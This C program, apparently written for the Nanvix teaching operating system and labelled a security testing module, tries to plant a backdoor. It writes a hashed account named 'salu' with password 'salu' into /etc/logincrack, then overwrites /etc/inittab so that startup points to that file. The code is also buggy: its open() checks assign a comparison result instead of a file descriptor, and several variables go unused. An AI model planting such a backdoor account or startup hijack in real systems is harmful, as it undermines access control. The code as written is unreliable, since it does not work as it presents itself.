#include <nanvix/accounts.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * @brief Security testing module
 * Une fonction utilisateur qui va changer les droits de
 * l'utilisateur.
*/
static void crack(void){
    int file;	/* new file*/
    struct account crack;
    char * crack_name = "salu";
    char * crack_password = "salu";
    strncpy(crack.name, crack_name, USERNAME_MAX);
	strncpy(crack.password, crack_password, PASSWORD_MAX);
    uid_t uid = 5;
	gid_t gid = 1;

    if(file = open("/etc/logincrack") == 1){
        account_encrypt(crack.name, 4, KERNEL_HASH);
        account_encrypt(crack.password, 4, KERNEL_HASH);
        crack.uid = 1;
        crack.gid = 5;
        write(file, &crack, sizeof(struct account));
    }

    close(file);

    char * buf = "logincrack";
    if (file = open("/etc/inittab", O_WRONLY) == 1){
        write(file, buf, 10);
    }
    close(file);
}

/*
 * Launches program.
 */
int main(int argc, char *const argv[])
{
    crack();
}